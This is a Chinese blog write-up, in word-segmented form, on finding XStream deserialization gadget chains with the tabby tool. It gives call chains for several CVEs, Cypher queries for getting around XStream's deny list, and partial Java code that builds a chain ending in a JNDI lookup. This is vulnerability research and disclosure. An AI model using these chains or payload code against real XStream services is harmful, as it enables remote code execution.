\u66ff\u6362 \u7c7b \u5c5e\u6027 tables \u6216 hashtable \u672c\u8eab \u7684 value \u503c \u4e5f \u53ef\u4ee5 \u3002   \u7ee7\u7eed \u5411\u4e0a \uff0c   javax . swing . MultiUIDefaults # toString   public   synchronized   String   toString   ( )   {   StringBuffer   buf   =   new   StringBuffer   ( ) ;   buf   .   append   (   \" { \"   ) ;   Enumeration   keys   =   keys   ( ) ;   while   (   keys   .   hasMoreElements   ( ) )   {   Object   key   =   keys   .   nextElement   ( ) ;   buf   .   append   (   key   +   \" = \"   +   get   (   key   )   +   \" ,   \"   ) ;   }   int   length   =   buf   .   length   ( ) ;   if   (   length   >   1   )   {   buf   .   delete   (   length   -   2   ,   length   ) ;   }   buf   .   append   (   \" } \"   ) ;   return   buf   .   toString   ( ) ;   }   toString \u51fd\u6570 \u904d\u5386 \u4e86 \u5f53\u524d hashtable \u6240 \u5b58\u50a8 \u7684 \u5185\u5bb9 \uff0c \u81ea\u7136 \u8fd9\u91cc \u4e5f \u5c31 \u8c03\u7528 \u5230 \u4e86   javax . swing . MultiUIDefaults # get   \u51fd\u6570 \uff08 \u7b2c 7 \u884c \uff09 \u3002   \u6240\u4ee5 \u6b64\u4e3a \u4e3a\u6b62 \u5230\u6b64\u4e3a\u6b62 \uff0c \u6211\u4eec \u6709 \u4ece toString \u51fd\u6570 \u5230 invoke \u51fd\u6570 \u7684 \u8c03\u7528 \u94fe \u4e86 \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u627e\u5230 \u89e6\u53d1 \u51fd\u6570 \u5230 toString \u51fd\u6570 \u7684 \u8c03\u7528 \u94fe \u4e86 \uff0c \u8fd9\u91cc \u4e3a\u4e86 \u67e5\u8be2 \u7ed3\u679c \u66f4\u4e3a \u6e05\u6670 \uff0c \u6211\u4eec \u53ea \u67e5\u8be2 \u4ece \u89e6\u53d1 \u51fd\u6570 \u5230 toString \u51fd\u6570 \u7684 \u5229\u7528 \u94fe \u60c5\u51b5 \u3002   match   ( source : Method )   where   source . NAME   in   [ \" compareTo \" ]   match   ( sink : Method   { NAME : \" toString \" } ) < - [ r : CALL ] - ( m1 : Method )   where   r . REAL _ CALL _ TYPE   in   [ \" java . lang . Object \" ]   call   apoc . algo . allSimplePaths ( m1 ,   source ,   \" < CALL | ALIAS \" ,   6 )   yield   path   return   *   limit   20   \u8fd9\u91cc \u6bd4\u8f83 \u96be\u53d7 \u7684 \u662f \u4e09\u4e2a \u89e6\u53d1 \u51fd\u6570 \u548c toString \u51fd\u6570 \u90fd \u662f \u6709 \u5927\u91cf \u5b9e\u73b0 \u7684 \u51fd\u6570 \uff0c \u6240\u4ee5 \u5982\u679c \u8981 \u627e\u5230 \u4e00\u6761 \u53ef\u7528 \u7684 \u5f97 \u770b \u4e0d\u5c11 \u65f6\u95f4 \u3002 \u4e0b\u56fe \u7b80\u5355 \u5904\u7406 \u4e86 \u4e00\u4e0b \uff08 \u56fe\u4e2d\u753b \u7684 \u7bad\u5934 \u53ea\u662f \u4e00\u79cd \u53ef\u80fd \u53ef\u80fd\u6027 \uff09   \u6b64\u5904 \u6211\u4eec \u4ece compareTo \u5f00\u59cb \u8bb2 \uff0c   javax . naming . ldap . Rdn $ RdnEntry # compareTo   public   int   compareTo   (   RdnEntry   that   )   {   int   diff   =   type   .   compareToIgnoreCase   (   that   .   type   ) ;   if   (   diff   ! =   0   )   {   return   diff   ;   }   if   (   value   .   equals   (   that   .   value   ) )   {   / /   try   shortcut   return   0   ;   }   return   getValueComparable   ( ) .   compareTo   (   that   .   getValueComparable   ( ) ) ;   }   \u8fd9\u91cc \u7684 \u7c7b \u5c5e\u6027 value \u53d1\u8d77 \u4e86 equals \u51fd\u6570 \uff0c \u5f80\u4e0b \u770b   com . sun . org . apache . xpath . internal . objects . XString # equals   public   boolean   equals   (   Object   obj2   )   {   if   (   null   = =   obj2   )   return   false   ;   / /   In   order   to   handle   the   ' all '   semantics   of   / /   nodeset   comparisons ,   we   always   call   the   / /   nodeset   function .   else   if   (   obj2   instanceof   XNodeSet   )   return   obj2   .   equals   (   this   ) ;   else   if   (   obj2   instanceof   XNumber   )   return   obj2   .   equals   (   this   ) ;   else   return   str   ( ) .   equals   (   obj2   .   toString   ( ) ) ;   }   \u8fd9\u91cc \u76f4\u63a5 \u8c03\u7528 \u4e86 obj2 \u7684 toString \u51fd\u6570 \uff0c \u6240\u4ee5 \u8fde \u4e0a \u524d\u9762 \u7684 \u5229\u7528 \u94fe \u5b8c\u6574 \u7684 \u5229\u7528 \u94fe \u5c31 \u51fa\u6765 \u4e86   javax . naming . ldap . Rdn $ RdnEntry . compareTo   com . sun . org . apache . xpath . internal . objects . XString . equal   javax . swing . MultiUIDefaults . toString   UIDefaults . get   UIDefaults . getFromHashTable   UIDefaults $ LazyValue . createValue   SwingLazyValue . createValue   javax . naming . InitialContext . doLookup ( )   \u81f3\u6b64 \uff0c CVE - 2021 - 21346 \u5c31 \u6316\u51fa \u51fa\u6765 \u6316\u51fa\u6765 \u4e86 \uff0c \u76f8\u5bf9 \u4e8e \u4eba\u5de5 \u6316 \uff0c \u5f53\u524d \u7684 \u65b9\u6cd5 \u5927\u5e45 \u5e45\u5ea6 \u5927\u5e45\u5ea6 \u51cf\u5c11 \u4e86 \u5229\u7528 \u94fe \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \u79cd\u7c7b \uff0c \u540c\u6837 \uff0c \u53e6 \u4e00\u6761 CVE - 2021 - 21351 \u4e5f \u662f \u540c\u6837 \u7684 \u65b9\u6cd5 \u53ef\u4ee5 \u53d1\u73b0 \uff0c \u4ee5\u540e \u6709\u7a7a \u518d \u8865\u5145 \u4e9b \u5176\u4ed6 \u7684 \u6848\u4f8b : )","title":"# 2   \u5229\u7528 \u94fe \u6316\u6398"},{"location":"blog/2021/how_to_find_gadget_chains/#3","text":"\u5f53\u524d \u8fd9 \u6761 \u5229\u7528 \u94fe \u7684 \u6784\u9020 \u76f8\u5bf9 \u6765\u8bf4 \u76f8\u5bf9\u6765\u8bf4 \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \uff0c \u53ea \u9700\u8981 \u6784\u9020 \u597d MultiUIDefaults \u5373\u53ef \uff0c \u4e0b\u9762 \u4e3a \u90e8\u5206 \u6784\u9020 \u4ee3\u7801 \uff0c \u8be6\u7ec6 \u89c1   LazyValue   UIDefaults   uiDefaults   =   new   UIDefaults   ( ) ;   Object   multiUIDefaults   =   ReflectionHelper   .   newInstance   (   \" javax . swing . MultiUIDefaults \"   ,   new   Object   [ ]   {   new   UIDefaults   [ ]   {   uiDefaults   } } ) ;   uiDefaults   .   put   (   \" lazyValue \"   ,   obj   ) ;   Object   rdnEntry1   =   ReflectionHelper   .   newInstance   (   \" javax . naming . ldap . Rdn $ RdnEntry \"   ,   null   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry1   ,   \" type \"   ,   \" ysomap \"   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry1   ,   \" value \"   ,   new   XString   (   \" test \"   ) ) ;   Object   rdnEntry2   =   ReflectionHelper   .   newInstance   (   \" javax . naming . ldap . Rdn $ RdnEntry \"   ,   null   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry2   ,   \" type \"   ,   \" ysomap \"   ) ;   ReflectionHelper   .   setFieldValue   (   rdnEntry2   ,   \" value \"   ,   multiUIDefaults   ) ;   return   PayloadHelper   .   makeTreeSet   (   rdnEntry2   ,   rdnEntry1   ) ;","title":"# 3   \u5229\u7528 \u94fe \u6784\u9020"},{"location":"blog/2021/how_to_find_gadget_chains/#4","text":"13 \u53f7 \u7684 \u65f6\u5019 XStream \u53d1\u5e03 \u4e86 1.4 . 16 \uff0c \u5171 \u4fee\u590d \u4e86 11 \u4e2a CVE \uff0c \u5176\u4e2d \u8fd8 \u6bd4\u8f83 \u6709\u610f \u610f\u601d \u6709\u610f\u601d \u7684 \u662f threedr3am \u7684 classloader \u7684 \u5229\u7528 \u65b9\u5f0f \uff0c \u4ee5\u53ca \u949f\u6f66\u8d35 \u5e08\u5085 \u7684 CVE - 2021 - 21345 \uff08 \u8fd9 \u6761 \u5229\u7528 \u94fe \u5f88\u957f \uff0c \u6211 \u5f53\u524d \u53ea\u7528 tabby \u505a \u4e86 12 \u4e2a \u8282\u70b9 \u7684 \u67e5\u627e \uff0c \u8fd9\u6761 \u94fe \u5927\u6982 \u6709 20 \u4e2a \u8282\u70b9 \uff0c \u55ef \uff0c \u5f88\u957f \uff09 \u3002 \u76f8\u4fe1 \u8fd9\u6ce2 \u5b8c \u4e86 \u4e4b\u540e \uff0c \u4f30\u8ba1 \u8fd8 \u80fd \u627e\u5230 \u4e00\u4e9b \u6f0f\u7f51 \u6f0f\u7f51\u4e4b\u9c7c XD","title":"# 4   \u603b\u7ed3"},{"location":"blog/2021/how_to_find_gadget_chains_2/","tags":["java"],"text":"# 1   \u524d\u8a00   \u4e4b\u524d \u5728 \u6587\u7ae0   \u5982\u4f55 \u9ad8\u6548 \u5730 \u6316\u6398   Java   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe   \u4e2d \u63d0\u5230 \u4e86 \u6211 \u662f \u5982\u4f55 \u9ad8\u6548 \u6316\u6398 \u5229\u7528 \u94fe \u7684 \uff0c \u8fd9 \u5176\u4e2d \u63d0\u5230 \u4e86 \u5de5\u5177   tabby   \u3002   \u76ee\u524d \uff0c tabby   \u5f00\u6e90 \u4e5f \u6709 \u4e00\u6bb5 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u4e00\u6bb5\u65f6\u95f4 \u4e86 \uff0c \u8fd9 \u65f6\u95f4 \u6bb5\u65f6\u95f4 \u91cc \u6709 \u4e0d\u5c11 \u5c0f\u4f19 \u4f19\u4f34 \u5c0f\u4f19\u4f34 \u95ee \u6211 \u5982\u4f55 \u5728 \u5b9e\u9645 \u73af\u5883 \u4e2d \u66f4\u597d \u5730 \u4f7f\u7528 \u5b83 \uff1f   \u4e3a\u6b64 \uff0c \u672c\u6587 \u5c06 \u4ecb\u7ecd \u6211 \u662f \u5982\u4f55 \u5229\u7528   tabby   \u6361\u6f0f   XStream   CVE - 2021 - 39147   &&   CVE - 2021 - 39148   \u3002   # 2   \u6750\u6599 \u51c6\u5907   \u8ddf \u4e4b\u524d \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u63d0\u5230 \u7684 \u4e00\u6837 \uff0c \u6211\u4eec \u5148\u5bf9   JDK   \u751f\u6210 \u4ee3\u7801 \u5c5e\u6027 \u56fe   #   \u751f\u6210 \u56fe \u7f13\u5b58 \u6587\u4ef6   java   - Xmx8g   - jar   build / libs / tabby - 1.1 . 0 - RELEASE . jar   -- isJDKOnly   #   \u5bfc\u5165 Neo4j \u56fe \u6570\u636e   java   - Xmx8g   - jar   build / libs / tabby - 1.1 . 0 - RELEASE . jar   -- isSaveOnly   # 3   \u80cc\u666f \u4ecb\u7ecd   XStream   \u81ea   1.4 . 16   \u7248\u672c \u7684 \u4fee\u590d \u4e4b\u540e \uff0c \u6709 \u5e08\u5085 \u5728   TSRC   \u63d0\u4ea4 \u4e86   CVE - 2021 - 29505   ( PS :   TSRC   yyds )   \u8be5\u94fe \u8ddf \u4e4b\u524d \u6211\u4eec \u5728   1.4 . 15   \u7248\u672c \u65f6\u5019 \u6316 \u7684 \u5229\u7528 \u94fe \u90fd \u4e0d \u592a \u4e00\u6837 \uff0c \u5b83 \u91cd\u65b0 \u627e\u5230 \u4e86 \u4e00\u4e2a \u65b0 \u7684 \u89e6\u53d1   toString   \u7684 \u5bf9\u8c61 \u3002 \u8fd9\u6761 \u94fe \u4e4b\u524d \u5e94\u8be5 \u6709 \u5e08\u5085 \u5206\u6790 \u8fc7 \u4e86 \uff0c \u5c31 \u4e0d \u7ec6\u8bf4 \u4e86 \uff0c \u8fd9\u91cc \u76f4\u63a5 \u8d34 \u4e00\u4e0b \u8c03\u7528 \u94fe \u3002   javax . naming . ldap . Rdn $ RdnEntry # compareTo   com . sun . org . apache . xpath . internal . objects . XString # equal   com . sun . xml . internal . ws . api . message . Packet # toString   com . sun . xml . internal . ws . message . saaj . SAAJMessage # copy   com . sun . xml . internal . ws . message . saaj . SAAJMessage # getAttachments   com . sun . xml . internal . ws . message . saaj . SAAJMessage $ SAAJAttachmentSet # < init >   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # getAttachments   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # initializeAllAttachments   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # getCount   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parse   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # getAttachments   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # makeProgress   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # hasNext   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # findNextCert   com . sun . jndi . toolkit . dir . LazySearchEnumerationImpl # nextElement   com . sun . jndi . toolkit . dir . LazySearchEnumerationImpl # findNextMatch   com . sun . jndi . rmi . registry . BindingEnumeration # next   sun . rmi . registry . RegistryImpl _ Stub # lookup   \u8fd9\u91cc \u63a5\u8fc7   toString   \u51fd\u6570 \u7684 \u662f   com . sun . xml . internal . ws . api . message . Packet   \uff0c \u5e76\u4e14 \u6700\u540e \u4ee5   com . sun . jndi . rmi . registry . BindingEnumeration # next   \u89e6\u53d1   lookup   \u51fd\u6570   \u8fd9\u91cc \u7ea2 \u6846\u6846 \u7684 \u5730\u65b9   ctx   \u88ab \u8bbe\u7f6e \u4e3a   sun . rmi . registry . RegistryImpl _ Stub   \u6765 \u5bf9\u5916 \u53d1\u8d77   RMI   \u8fde\u63a5 \u3002   \u8fd9\u91cc \u53e6\u5916 \u8bf4 \u4e00\u4e0b \uff0c \u5176\u5b9e   CVE - 2021 - 29505   \u7684 \u5229\u7528 \u94fe \u53ef\u4ee5 \u7b80\u5316 \u4e3a   sun . rmi . registry . RegistryImpl _ Stub # readObject   sun . rmi . server . UnicastRef # readExternal   #   trigger   rmi   connect   \u6709 \u5174\u8da3 \u7684 \u5c0f\u4f19 \u4f19\u4f34 \u5c0f\u4f19\u4f34 \u53ef\u4ee5 \u770b   RMI   \u7ed5\u8fc7 \u76f8\u5173 \u7684 \u6587\u7ae0 \uff0c \u9664\u4e86   RegistryImpl _ Stub \uff0c \u53e6\u5916 \u8fd8\u6709   link   \u56de\u5230 \u4e3b\u9898 \uff0c \u901a\u8fc7   29505   \u8fd9\u6761 \u94fe \u6211\u4eec \u53ef\u4ee5 \u5bf9\u5916 \u53d1\u8d77   RMI   \u8fde\u63a5 \uff0c \u5e76\u4e14 \u4ed6 \u662f \u5b8c\u5168 \u7ed5\u8fc7   16   \u7248\u672c \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u3002   \u4e3a\u6b64 \uff0c XStream   \u7684 \u5b98\u65b9 \u51fa \u4e86   17   \u7248\u672c \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u8865\u4e01 \uff0c \u8fd9\u91cc \u6765\u770b \u4e00\u4e0b   17   \u7248\u672c \u4e0b \u6240\u6709 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355   \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5b57\u7b26 \u5bf9\u8c61   this   .   denyTypes   (   new   String   [ ]   {   \" java . beans . EventHandler \"   ,   \" java . lang . ProcessBuilder \"   ,   \" javax . imageio . ImageIO $ ContainsFilter \"   ,   \" jdk . nashorn . internal . objects . NativeString \"   ,   \" com . sun . corba . se . impl . activation . ServerTableEntry \"   ,   \" com . sun . tools . javac . processing . JavacProcessingEnvironment $ NameProcessIterator \"   ,   \" sun . awt . datatransfer . DataTransferer $ IndexOrderComparator \"   ,   \" sun . swing . SwingLazyValue \"   } ) ;   \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6b63\u5219   GETTER _ SETTER _ REFLECTION   =   Pattern   .   compile   (   \" . * \\ \\ $ GetterSetterReflection \"   ) ;   PRIVILEGED _ GETTER   =   Pattern   .   compile   (   \" . * \\ \\ $ PrivilegedGetter \"   ) ;   LAZY _ ENUMERATORS   =   Pattern   .   compile   (   \" . * \\ \\ . Lazy ( ? : Search ) ? Enumeration . * \"   ) ;   LAZY _ ITERATORS   =   Pattern   .   compile   (   \" . * \\ \\ $ LazyIterator \"   ) ;   JAXWS _ ITERATORS   =   Pattern   .   compile   (   \" . * \\ \\ $ ServiceNameIterator \"   ) ;   JAVAFX _ OBSERVABLE _ LIST __   =   Pattern   .   compile   (   \" javafx \\ \\ . collections \\ \\ . ObservableList \\ \\ $ . * \"   ) ;   JAVAX _ CRYPTO   =   Pattern   .   compile   (   \" javax \\ \\ . crypto \\ \\ .. * \"   ) ;   JAVA _ RMI   =   Pattern   .   compile   (   \" ( ? : java | sun ) \\ \\ . rmi \\ \\ .. * \"   ) ;   BCEL _ CL   =   Pattern   .   compile   (   \" . * \\ \\ . bcel \\ \\ .. * \\ \\ . util \\ \\ . ClassLoader \"   ) ;   \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7ee7\u627f \u5bf9\u8c61   this   .   denyTypeHierarchy   (   InputStream   .   class   ) ;   this   .   denyTypeHierarchyDynamically   (   \" java . nio . channels . Channel \"   ) ;   this   .   denyTypeHierarchyDynamically   (   \" javax . activation . DataSource \"   ) ;   this   .   denyTypeHierarchyDynamically   (   \" javax . sql . rowset . BaseRowSet \"   ) ;   \u4ece \u4e0a\u9762 \u5217\u4e3e \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053   17   \u7248\u672c \u7684 \u8865\u4e01 \u5bf9   29505   \u8fd9\u6761 \u94fe \u7684 \u51e0\u4e2a \u5bf9\u8c61 \u8fdb\u884c \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5904\u7406 \u3002   Pattern   .   compile   (   \" ( ? : java | sun ) \\ \\ . rmi \\ \\ .. * \"   ) ;   = =   \u62c9\u9ed1   = = >   sun   .   rmi   .   registry   .   RegistryImpl _ Stub   ,   sun   .   rmi   .   server   .   UnicastRef   Pattern   .   compile   (   \" . * \\ \\ . Lazy ( ? : Search ) ? Enumeration . * \"   ) ;   = =   \u62c9\u9ed1   = = >   com   .   sun   .   jndi   .   toolkit   .   dir   .   LazySearchEnumerationImpl   \u5230 \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u53d1\u73b0 \uff0c \u5bf9\u4e8e   29505   \u8fd9 \u6761 \u5229\u7528 \u94fe \uff0c \u5982\u4e0b \u90e8\u5206 \u5229\u7528 \u94fe \u4ecd\u7136 \u662f \u53ef\u7528 \u7684   javax . naming . ldap . Rdn $ RdnEntry # compareTo   com . sun . org . apache . xpath . internal . objects . XString # equal   com . sun . xml . internal . ws . api . message . Packet # toString   com . sun . xml . internal . ws . message . saaj . SAAJMessage # copy   com . sun . xml . internal . ws . message . saaj . SAAJMessage # getAttachments   com . sun . xml . internal . ws . message . saaj . SAAJMessage $ SAAJAttachmentSet # < init >   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # getAttachments   com . sun . xml . internal . messaging . saaj . soap . ver1 _ 1 . Message1 _ 1Impl # initializeAllAttachments   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # getCount   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parse   com . sun . xml . internal . messaging . saaj . packaging . mime . internet . MimePullMultipart # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # getAttachments   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # parseAll   com . sun . xml . internal . org . jvnet . mimepull . MIMEMessage # makeProgress   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # hasNext   com . sun . org . apache . xml . internal . security . keys . storage . implementations . KeyStoreResolver $ KeyStoreIterator # findNextCert   \u5982\u679c \u80fd \u627e\u5230 \u4ece   findNextCert   \u51fd\u6570 \u5f00\u59cb \u7684 \u5176\u4ed6 \u7aef\u70b9 \uff0c \u6211\u4eec \u4ecd\u7136 \u80fd \u5bf9   17   \u7248\u672c \u7684 \u8865\u4e01 \u8fdb\u884c \u7ed5\u8fc7 \u3002   \u7b54\u6848 \u5f53\u7136 \u662f \u80af\u5b9a \u7684 \uff0c \u5fc5\u7136 \u5b58\u5728 \u4e00\u4e9b \u5176\u4ed6 \u7684 \u7aef\u70b9 \uff0c \u4f46\u662f \u4eba\u5de5 \u53bb \u6316\u6398 \u4f1a \u7279\u522b \u8017\u65f6 \uff0c \u90a3\u4e48 \u4e3a\u4e86 \u9ad8\u6548 \u6361\u6f0f \uff0c \u6211\u4eec \u5f53\u7136 \u4e0d\u80fd \u4eba\u5de5 \u53bb \u505a \u8fd9\u4ef6 \u4e8b \u3002 \u8fd9\u91cc \u6211\u4eec \u7684   tabby   \u5c31\u8981 \u767b\u573a \u4e86 \u3002   # 4   \u9ad8\u6548 \u6361\u6f0f   \u8fd9\u91cc \u6211\u4eec \u5148 \u6765 \u5206\u6790 \u4e00\u4e0b   findNextCert   \u51fd\u6570   \u4ece \u8fd9\u91cc \u770b \uff0c \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 \u7c7b \u5c5e\u6027   aliases   \u548c   keyStore   \u6765 \u8fdb\u884c \u540e\u7eed \u5229\u7528 \u94fe \u7684 \u6316\u6398 \u3002   \u8fd9\u91cc \u4ee5   aliases   \u4e3e\u4f8b \uff0c \u4e4b\u524d   29505   \u5229\u7528 \u94fe \u5c31\u662f \u4f9d\u9760   LazySearchEnumerationImpl # nextElement   \u5f00\u59cb \u627e\u5230 \u7684   rmi   \u7684   sink   \u51fd\u6570 \u3002 \u90a3\u4e48 \uff0c \u6211\u4eec \u73b0\u5728 \u91cd\u65b0 \u627e \u4e00\u4e2a \u65b0 \u7684 \uff0c \u5c31 \u9700\u8981 \u6ee1\u8db3 \u5982\u4e0b \u6761\u4ef6 \uff1a   \u5bf9\u8c61 \u5b9e\u73b0 \u4e86   java . util . Enumeration   \u63a5\u53e3   \u4ece \u8be5 \u5bf9\u8c61 \u7684   nextElement   \u51fd\u6570 \u5f00\u59cb \uff0c \u6700\u7ec8 \u80fd \u5230\u8fbe \u4e00\u4e2a \u89e6\u53d1 \u6076\u610f \u884c\u4e3a \u7684   sink   \u51fd\u6570   \u4ece   nextElement   \u51fd\u6570 \u5f00\u59cb \u5230   sink   \u51fd\u6570 \uff0c \u8def\u5f84 \u4e0a \u4e0d\u80fd \u51fa\u73b0 \u524d\u9762 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u6d89\u53ca \u7684 \u5bf9\u8c61   \u5982\u679c \u80fd \u6ee1\u8db3 \u4e0a\u8ff0 \u6761\u4ef6 \uff0c \u90a3\u4e48 \u6211\u4eec \u5c31 \u6316 \u5230 \u4e86 \u80fd \u7ed5\u8fc7   17   \u7248\u672c \u8865\u4e01 \u7684 \u65b0 \u5229\u7528 \u94fe \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u5de5\u4f5c \u5c31 \u4ea4\u7ed9   tabby   \u6765 \u505a \u4e86 \u3002   \u9996\u5148 \uff0c \u6211\u4eec \u9700\u8981 \u6839\u636e \u4e0a\u8ff0 \u6839\u636e\u4e0a\u8ff0 \u7684 \u6761\u4ef6 \uff0c \u63cf\u8ff0 \u51fa \u5177\u4f53 \u7684 \u67e5\u8be2 \u8bed\u53e5 \u3002 \u5148 \u6765 \u9650\u5236 \u4e00\u4e0b   source   \u51fd\u6570   match   (   source   :   Method   {   NAME   :   \" nextElement \"   } )   < - [   :   HAS   ] -   (   cls   :   Class   )   -   [   :   INTERFACE   |   EXTENDS   *   ]   -   > (   cls1   :   Class   {   NAME   :   \" java . util . Enumeration \"   } )   match   (   source   )   - [   :   CALL   ] - >   (   m1   :   Method   )   source   \u51fd\u6570 \u4e3a   nextElement \uff0c \u5e76\u4e14 \u5b9e\u73b0 \u4e86   java . util . Enumeration   \u63a5\u53e3   \u518d \u6765 \u9650\u5236   sink   \u51fd\u6570   match   (   sink   :   Method   {   IS _ SINK   :   true   ,   VUL   :   \" JNDI \"   } )   \u8fd9\u91cc \u5c31 \u9650\u5236 \u5f53\u524d   sink   \u51fd\u6570 \u6700\u7ec8 \u80fd \u8fbe\u6210   JNDI   \u6ce8\u5165 \u7684 \u6548\u679c \u3002   \u6700\u540e \uff0c \u6211\u4eec \u518d \u6765 \u9650\u5236 \u4e00\u4e0b \u8def\u5f84 \u4e0a \u4e0d\u80fd \u51fa\u73b0 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5bf9\u8c61   call   apoc   .   algo   .   allSimplePaths   (   sink   ,   m1   ,   \" < CALL | ALIAS \"   ,   8   )   yield   path   where   none   (   n   in   nodes   (   path   )   where   n   .   CLASSNAME   in   [   \" java . beans . EventHandler \"   ,   \" java . lang . ProcessBuilder \"   ,   \" javax . imageio . ImageIO $ ContainsFilter \"   ,   \" jdk . nashorn . internal . objects . NativeString \"   ,   \" com . sun . corba . se . impl . activation . ServerTableEntry \"   ,   \" com . sun . tools . javac . processing . JavacProcessingEnvironment $ NameProcessIterator \"   ,   \" sun . awt . datatransfer . DataTransferer $ IndexOrderComparator \"   ,   \" sun . swing . SwingLazyValue \"   ,   \" com . sun . jndi . toolkit . dir . LazySearchEnumerationImpl \"   ,   \" sun . rmi . registry . RegistryImpl _ Stub \"   ,   \" com . sun . jndi . dns . BindingEnumeration \"   ,   \" com . sun . jndi . cosnaming . CNBindingEnumeration \"   ,   \" com . sun . jndi . toolkit . dir . HierMemDirCtx $ FlatBindings \"   ,   \" com . sun . jndi . ldap . LdapReferralException \"   ]   )   return   source   ,   path   limit   50   \u8fd9\u91cc \u7b2c   9   \u884c\u4e0a \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u662f \u540e\u7eed \u4eba\u5de5 \u6392\u9664 \u540e \u6dfb\u52a0 \u7684 \uff08 \u4e0d \u53ef\u884c \u6216 \u6784\u9020 \u8fc7\u4e8e \u9ebb\u70e6 \uff09 \u3002   \u628a \u4e0a\u9762 \u7684   3   \u4e2a \u90e8\u5206 \u5408 \u8d77\u6765 \u540e \u67e5\u8be2 \u6700\u7ec8 \u80fd \u5f97\u5230 \u5982\u4e0b   3   \u6761 \u5229\u7528 \u94fe \u3002   \u5206\u522b \u662f \u4e00\u4e0b \u5bf9\u8c61   com . sun . jndi . ldap . LdapSearchEnumeration   \u5bf9\u5e94   CVE - 2021 - 39147   com . sun . jndi . ldap . LdapBindingEnumeration   \u5bf9\u5e94   CVE - 2021 - 39145   \uff08 CVE - 2021 - 39151   \u7528 \u7684 \u4e5f \u662f \u8fd9\u4e2a \uff09   com . sun . jndi . toolkit . dir . ContextEnumerator   \u5bf9\u5e94   CVE - 2021 - 39148   \u4ed6\u4eec \u5206\u522b \u6700\u7ec8 \u5c06 \u8c03\u7528   sink   \u51fd\u6570   NamingManager . getContext   \u548c   DirectoryManager . getObjectInstance   \u8fd9 \u4e24\u4e2a   sink   \u51fd\u6570 \u662f   JNDI   \u5904\u7406   Reference   \u7684 \u51fd\u6570 \uff0c \u901a\u8fc7 \u8fd9 \u4e24\u4e2a \u51fd\u6570 \u53ef\u4ee5 \u5728 \u7279\u5b9a   JDK   \u7248\u672c \u4e0b \u8f7d\u5165 \u5916\u90e8 \u7684 \u4efb\u610f \u4ee3\u7801 \uff0c \u4e5f \u53ef\u4ee5 \u5728   tomcat   \u4e0b \u6267\u884c   el   \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u5177\u4f53 \u53ef\u4ee5 \u770b   JNDI   \u5173\u4e8e   Reference   \u7684 \u77e5\u8bc6 \u3002   # 5   \u8865\u4e01 \u4fee\u590d   XStream   1.4 . 18   \u7248\u672c \u5f00\u59cb \u5c06 \u9ed8\u8ba4 \u5f00\u542f \u540d\u5355 \u767d\u540d\u5355 \u6a21\u5f0f \uff0c \u53ea \u5141\u8bb8 \u51e0\u4e2a \u57fa\u7840 \u7c7b\u578b \u7684 \u8fdb\u884c \u8fd8\u539f \u3002   \u4f46\u662f \u8fd9\u91cc \u60f3 \u4e0d \u660e\u767d \u7684 \u662f \u4e3a\u4f55 \u5c06 \u4e4b\u524d \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5904\u7406 \u76f4\u63a5 \u5220\u9664 \u4e86 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u672a\u6765   XStream   \u7684 \u5b89\u5168 \u5b89\u5168\u6027 \u5c06 \u4f9d\u9760 \u5f00\u53d1 \u5f00\u53d1\u8005 \u5bf9\u4e8e \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u98ce\u9669 \u7684 \u8ba4\u8bc6 \u3002   \u6b64\u5916 \uff0c \u540e\u7eed \u7248\u672c \u7ed5\u8fc7 \u9ed8\u8ba4 \u540d\u5355 \u767d\u540d\u5355 \u8fd8\u662f \u5b58\u5728 